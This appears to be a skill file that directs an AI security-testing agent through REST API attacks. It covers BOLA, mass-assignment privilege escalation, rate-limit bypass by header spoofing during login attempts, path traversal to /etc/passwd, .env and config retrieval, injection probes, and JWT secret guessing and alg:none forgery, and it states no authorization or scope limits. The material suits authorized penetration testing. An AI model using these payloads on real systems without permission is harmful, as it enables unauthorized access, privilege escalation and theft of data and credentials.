---
name: api-security
description: "REST API security testing covering mass assignment, BOLA, rate limiting bypass, and API versioning attacks"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, evaluateRendered, findEndpointsInResponse, updateGraph, writeFinding, encodeDecode, followRedirects, recordEvidence, getCapturedHeaders]
triggers: ["api security testing", "rest api security", "api vulnerability", "mass assignment", "bola", "broken object level authorization", "api rate limit", "api versioning attack", "api enumeration", "api penetration testing"]
contextBoosts: [api]
mitreAttack: ["T1190", "T1046"]
owaspRefs: ["OWASP API Security Top 10 API1:2023 Broken Object Level Authorization", "OWASP Top 10 A01:2021 Broken Access Control"]
---

# REST API Security Testing

## When to Use
- Target exposes REST/GraphQL APIs with structured endpoints (JSON/XML responses)
- Endpoints accept object IDs in path or request body
- Application has multiple user roles (user, admin, moderator)
- API has versioned endpoints (v1, v2, api/v1, etc.)
- OpenAPI/Swagger documentation is publicly accessible
- Rate limiting is suspected but unconfirmed
- JWT, API keys, or OAuth2 tokens are used for authentication

## Do Not Use
- Static file serving (CSS, JS, images) with no API logic
- WebSocket-only endpoints (use dedicated WS testing skills)
- SOAP/XML-RPC APIs (different attack surface)
- Server-rendered HTML pages with no API calls
- When you have zero valid API tokens — acquire one first

## Auth Context

Before making HTTP requests, call **getCapturedHeaders** with the target URL and role to get real headers. Pass these in the `headers` parameter of httpRequest.

Decision tree for API auth mechanisms:
```
Is token in Authorization header?
  YES → Is it "Bearer <token>"?
         YES → Decode JWT, check claims, test algorithm
         NO  → Is it "Basic <credentials>"?
                YES → Test credential scoping, default accounts
                NO  → Is it "ApiKey <key>" or custom header?
                       YES → Test key rotation, scope, leakage
  NO  → Is token in query string?
         YES → Token leakage via Referer, logs, proxy caches
         NO  → Is auth in cookie?
                YES → Test CSRF, session fixation
                NO  → Is auth in custom header (X-API-Key)?
                       YES → Test key enumeration, rate limiting per key
```

## API Discovery

### OpenAPI/Swagger Enumeration

Check for exposed API documentation before testing:
```
GET /swagger.json
GET /swagger/v1/swagger.json
GET /api-docs
GET /api-docs/v1
GET /openapi.json
GET /openapi.yaml
GET /docs
GET /redoc
GET /.well-known/openapi.json
```

Parse discovered schemas to extract all endpoints, parameters, and models. Every endpoint in the schema is a testing target.

### Common API Paths

Systematically probe these paths for hidden or undocumented endpoints:
```
/api/
/api/v1/
/api/v2/
/api/internal/
/api/admin/
/graphql
/graphql/console
/health
/healthz
/ready
/metrics
/debug/
/debug/vars
/debug/pprof/
/status
/config
/env
/.env
/actuator
/actuator/health
/actuator/env
```

### Version Detection

Test multiple version formats simultaneously:
```
/api/v1/users → /api/v2/users → /api/v3/users
/api/users?version=1 → /api/users?version=2
/api/users?api_version=1
/api/users (check response header X-API-Version or X-Version)
/api/users (check response body for version field)
```

## BOLA (Broken Object Level Authorization)

BOLA is the most common API vulnerability. Test by manipulating object references across authorization boundaries.

### Sequential ID Enumeration

```bash
# Capture authenticated request to own resource
# GET /api/users/1234/orders → returns order list

# Test sequential IDs with same auth
GET /api/users/1235/orders
GET /api/users/1236/orders
GET /api/users/1237/orders

# If response returns different user's data → BOLA confirmed
```

### UUID Manipulation

```bash
# If endpoint uses UUIDs, look for leaked UUIDs in:
# - API responses (list endpoints)
# - JavaScript source code
# - Error messages
# - WebSocket messages
# - Email notifications

# Once you have a valid UUID, test cross-user access
GET /api/files/550e8400-e29b-41d4-a716-446655440000
GET /api/files/660e8400-e29b-41d4-a716-446655440001
```

### Nested Object Access

```bash
# Test authorization at each nesting level
GET /api/organizations/100/members/200          → org member check
GET /api/organizations/101/members/200          → cross-org access?
GET /api/organizations/100/members/200/documents → nested resource
GET /api/organizations/101/members/200/documents → cross-org nested?

# Test parent ID substitution
GET /api/users/USER_A/orders/ORDER_B            → should work
GET /api/users/USER_A/orders/ORDER_C            → ORDER_C belongs to USER_B?
```

### Cross-Tenant Access

```bash
# Test tenant boundary crossing
GET /api/tenants/tenant_A/data
GET /api/tenants/tenant_B/data  # Different tenant

# Test with org_id in body instead of path
POST /api/data
Body: {"org_id": "different_org_id", "query": "select * from users"}

# Test via query parameter override
GET /api/data?org_id=other_tenant
GET /api/data?tenant_id=other_tenant
```

### BOLA Test Protocol

1. Authenticate as User A, capture request to resource R
2. Note all object references: URL IDs, body IDs, query params, headers
3. Authenticate as User B (different role/tenant)
4. Replay User A's request with User B's session token
5. If User A's resource data appears in User B's session → Horizontal BOLA
6. Repeat with regular user accessing admin endpoints → Vertical BOLA
7. Test with no auth token → Unauthenticated BOLA

## Mass Assignment

APIs that bind request body fields directly to internal models are vulnerable to mass assignment.

### Attack Payloads

```bash
# Standard user registration
POST /api/users
Content-Type: application/json
{
  "username": "testuser",
  "email": "test@example.com",
  "password": "securepass123"
}

# Mass assignment — inject privileged fields
POST /api/users
Content-Type: application/json
{
  "username": "testuser",
  "email": "test@example.com",
  "password": "securepass123",
  "role": "admin",
  "isAdmin": true,
  "verified": true,
  "credits": 999999,
  "discount_percent": 100,
  "price_override": 0,
  "internal_id": 1,
  "created_at": "2020-01-01T00:00:00Z",
  "email_verified": true,
  "permissions": ["read", "write", "delete", "admin"]
}
```

### Mass Assignment Vectors

```bash
# User profile update
POST /api/profile/update
{
  "name": "John",
  "bio": "Hello world",
  "role": "admin",            ← privilege escalation
  "account_type": "enterprise" ← billing bypass
}

# Product creation (e-commerce)
POST /api/products
{
  "name": "Widget",
  "price": 29.99,
  "cost": 5.00,
  "margin": 83.0,             ← business logic leak
  "internal_sku": "SKU-001",  ← internal field leak
  "is_featured": true,        ← unauthorized promotion
  "inventory_count": 9999     ← stock manipulation
}

# Order modification
PATCH /api/orders/1234
{
  "status": "shipped",
  "payment_status": "paid",   ← payment bypass
  "tracking_number": "FAKE",
  "refund_eligible": true     ← business logic manipulation
}
```

### Detection Strategy

```bash
# 1. Capture legitimate request and response
# 2. Add one extra field at a time to the request body
# 3. Send the modified request
# 4. Check if the field was accepted (reflected in response or database)
# 5. Test these field categories:

# Privilege escalation fields
"role", "isAdmin", "admin", "is_admin", "user_type", "account_level"
"permissions", "access_level", "privileges", "groups", "scopes"

# Business logic fields
"price", "cost", "discount", "credits", "balance", "subscription_tier"
"verified", "email_verified", "active", "approved", "confirmed"

# Internal/meta fields
"internal_id", "created_at", "updated_at", "deleted_at"
"created_by", "updated_by", "migrated_from", "legacy_id"

# Security fields
"password_hash", "reset_token", "api_key", "secret"
"email_confirmed", "phone_verified", "mfa_enabled"
```

## Rate Limiting Bypass

### IP Rotation Techniques

```bash
# X-Forwarded-For header spoofing
GET /api/resource
X-Forwarded-For: 1.2.3.4

# Incrementing IP per request
for i in $(seq 1 20); do
  IP="1.2.$((i/256)).$((i%256))"
  curl -s -H "X-Forwarded-For: $IP" https://target.com/api/login \
    -d '{"user":"admin","pass":"test"}'
done

# X-Real-IP header
GET /api/resource
X-Real-IP: 10.0.0.1

# Client-IP header
GET /api/resource
Client-IP: 192.168.1.1

# True-Client-IP (Cloudflare)
GET /api/resource
True-Client-IP: 8.8.8.8

# X-Forwarded header chain
GET /api/resource
X-Forwarded-For: 127.0.0.1, 10.0.0.1, 172.16.0.1
```

### Chunked Transfer Encoding

```bash
# Some rate limiters inspect Content-Length but not chunked encoding
POST /api/login
Transfer-Encoding: chunked

d
{"user":"adm
b
in","pass":
11
"test123456789
0

# This sends the same body but may bypass Content-Length-based limits
```

### Parameter Pollution

```bash
# Duplicate parameters
POST /api/login
Body: user=admin&user=backup&pass=wrong&pass=also_wrong

# Same-name JSON array
POST /api/search
{"query": ["a","b","c","d","e","f","g","h","i","j"]}

# Multiple Content-Type headers
POST /api/data
Content-Type: application/json
Content-Type: application/x-www-form-urlencoded
```

### Method-Based Bypass

```bash
# Rate limit may only apply to POST, not GET
# If login is POST /api/login, test if GET works:
GET /api/login?user=admin&pass=test

# Or if rate limit is per-POST but not per-PUT/PATCH
PUT /api/login
{"user":"admin","pass":"test"}

PATCH /api/login
{"user":"admin","pass":"test"}
```

### Timing Attacks

```bash
# Measure response time to determine if rate limiting is active
# Send rapid requests and check if delay increases
for i in $(seq 1 30); do
  TIME=$(curl -s -o /dev/null -w "%{time_total}" \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d '{"user":"admin","pass":"wrong"}' \
    https://target.com/api/login)
  echo "Request $i: ${TIME}s"
done

# Sudden increase after N requests = rate limit threshold identified
```

## API Versioning Attacks

### Deprecated Version Testing

```bash
# Old versions often have weaker security controls
GET /api/v1/admin/users     → Check if v1 has no auth check
GET /api/v2/admin/users     → Current version may require auth

# Version with relaxed validation
POST /api/v1/register
{"username":"admin","password":"x","role":"admin"}

POST /api/v2/register
{"username":"admin","password":"x","role":"admin"}
# v2 may reject role field, v1 may not

# Version bypass via parameter
GET /api/users?version=1
GET /api/users?api_version=1
GET /api/users?v=1

# Version in Accept header
GET /api/users
Accept: application/vnd.api+json;version=1

# Version in custom header
GET /api/users
X-API-Version: 1
X-Version: 1
```

### Version Enumeration

```bash
# Discover all available versions
GET /api/versions
GET /api/status
GET /api/config
# Check response body for version info

# Brute force version numbers
for v in 1 2 3 4 5 6 7 8 9 10; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" \
    "https://target.com/api/v$v/users")
  echo "v$v: $STATUS"
done
```

## HTTP Method Tampering

### Method Override Headers

```bash
# If POST is rate-limited but PUT is not:
POST /api/resource
X-HTTP-Method-Override: DELETE
X-HTTP-Method: DELETE
X-Method-Override: DELETE

# Some frameworks respect these headers on POST
# This can bypass method-based access controls

# Test all methods on each endpoint
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE CONNECT; do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X "$method" \
    -H "Authorization: Bearer $TOKEN" \
    "https://target.com/api/admin/users")
  echo "$method: $RESPONSE"
done
```

### PATCH Bypass

```bash
# If PUT is restricted but PATCH is not:
PUT /api/users/123
{"role": "admin"}
# → 403 Forbidden

PATCH /api/users/123
{"role": "admin"}
# → 200 OK (bypassed PUT restriction)

# Merge-style patch can inject fields
PATCH /api/users/123
{"$set": {"role": "admin"}}
{"$inc": {"credits": 99999}}
```

### TRACE Method (XST)

```bash
# Cross-Site Tracing — reflects headers back
TRACE /api/resource
# If response contains full headers including cookies → XST vulnerability

# Test with XMLHttpRequest
curl -X TRACE https://target.com/api/resource -H "Cookie: session=abc"
```

## Content-Type Manipulation

### Format Switching

```bash
# Switch between JSON, XML, and form-data
# Server may validate only one format

# JSON (primary)
POST /api/users
Content-Type: application/json
{"username":"admin","role":"admin"}

# XML (bypass JSON validation)
POST /api/users
Content-Type: application/xml
<?xml version="1.0"?>
<user>
  <username>admin</username>
  <role>admin</role>
</user>

# Form-data (bypass JSON schema validation)
POST /api/users
Content-Type: application/x-www-form-urlencoded
username=admin&role=admin

# Multipart (bypass content inspection)
POST /api/users
Content-Type: multipart/form-data; boundary=----boundary
------boundary
Content-Disposition: form-data; name="data"
{"username":"admin","role":"admin"}
------boundary--
```

### Content-Type Confusion

```bash
# Send JSON body with XML Content-Type
POST /api/data
Content-Type: application/xml
{"payload": "test"}

# Some servers parse based on Content-Type header, not body format
# This can bypass input validation

# Charset bypass
POST /api/data
Content-Type: application/json;charset=UTF-16
{"payload":"test"}

# Charset injection
POST /api/data
Content-Type: application/json; charset=ISO-8859-1
{"payload":"test\u0000"}
```

## Error Information Disclosure

### Verbose Error Probing

```bash
# Trigger validation errors and examine response
POST /api/users
Content-Type: application/json
{}  # Empty body

POST /api/users
Content-Type: application/json
{"email": "not-an-email"}

GET /api/users/99999999  # Non-existent ID
GET /api/users/abc       # Wrong type (string vs int)

POST /api/data
Content-Type: application/json
{"query": "' OR 1=1 --"}  # SQL injection probe
{"query": "{{7*7}}"}}     # SSTI probe
{"query": "<script>alert(1)</script>"}  # XSS probe
```

### Stack Trace Detection

```bash
# Look for these in error responses:
# - Java stack traces (at com.example...)
# - PHP errors (Fatal error, Warning)
# - Python tracebacks (Traceback, File "...")
# - Node.js errors (TypeError, ReferenceError)
# - .NET errors (System.Exception, StackTrace)

# Force server errors
GET /api/users/../../etc/passwd
GET /api/users/..%2f..%2fetc%2fpasswd
POST /api/data
Content-Type: application/json
{"__proto__":{"isAdmin":true}}  # Prototype pollution probe
```

### Debug Mode Detection

```bash
# Check for debug endpoints
GET /debug/vars
GET /debug/pprof/
GET /debug/pprof/goroutine?debug=1
GET /actuator
GET /actuator/env
GET /actuator/configprops
GET /swagger-resources
GET /elmah.axd

# Check response headers for debug info
X-Powered-By: Express
X-AspNet-Version: 4.0.30319
Server: Apache/2.4.41 (Ubuntu)
X-Debug-Token: abc123
X-Request-ID: debug-session-abc
```

## JWT/API Key Security

### Token Leakage via URL

```bash
# Check if token appears in:
# - Referer header on external navigation
# - Browser history
# - Server access logs
# - Proxy logs
# - Client-side JavaScript (window.location)

GET /api/resource?access_token=TOKEN
# Check Referer header in network tab

# Test if server accepts token in query string
GET /api/resource?token=TOKEN
GET /api/resource?jwt=TOKEN
GET /api/resource?api_key=TOKEN
```

### Weak Signing Detection

```bash
# Test common weak secrets
TOKEN="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.SIGNATURE"

# Common secrets to try
for secret in secret password key 123456 supersecret jwt_secret \
  change-me mysecret test secret123 admin your-secret-here \
  shhhhh dont-tell-anyone qwerty abc123; do
  # Forge token with each secret
  # If any work → weak signing
done
```

### Key Rotation Issues

```bash
# Test if old API keys still work after rotation
# 1. Note current API key from response headers or config
# 2. If key rotation is suspected, test with previous key
# 3. Check if revoked tokens are still accepted

# Test for key in client-side code
GET /app.js
GET /bundle.js
GET /main.js
# Search for: apiKey, api_key, token, secret, authorization

# Test for key in configuration files
GET /.env
GET /config.json
GET /config.yaml
GET /settings.json
```

### Algorithm Downgrade

```bash
# If server accepts multiple algorithms:
# 1. Decode JWT header
# 2. Change alg from RS256 to HS256
# 3. Sign with public key as HMAC secret
# 4. If server accepts → critical vulnerability

# Check for alg:none support
# Modify header: {"alg":"none","typ":"JWT"}
# Remove signature portion
# If accepted → auth bypass
```

## Anti-Hallucination

Your claims will be verified against real tool output. Never fabricate findings.

Every vulnerability you report MUST have a corresponding tool call response that proves it.

If a tool call fails, say so honestly — do not invent a success.

Do NOT claim:
- "Endpoint X is vulnerable to BOLA" without sending requests to two different user IDs
- "Mass assignment exists" without showing the injected field persisted in the response
- "Rate limiting is bypassed" without demonstrating request count exceeds the stated limit
- "Version X is less secure" without testing both versions and comparing responses
- "Content-Type bypass works" without showing different behavior across content types

Do NOT assume:
- A 200 response means the endpoint is vulnerable (check response body for actual data)
- That a 403 means the endpoint is secure (may be returning forbidden for wrong reason)
- That rate limiting is absent just because you sent 10 requests (test with 100+)
- That a version endpoint exists without probing common version patterns

Always verify:
- Response status code AND body content for every request
- That returned data belongs to the authenticated user, not a generic response
- That rate limiting thresholds are measured, not guessed
- That content-type changes produce structurally different responses
- That version differences are in security controls, not just API shape
- That error messages do not leak internal implementation details
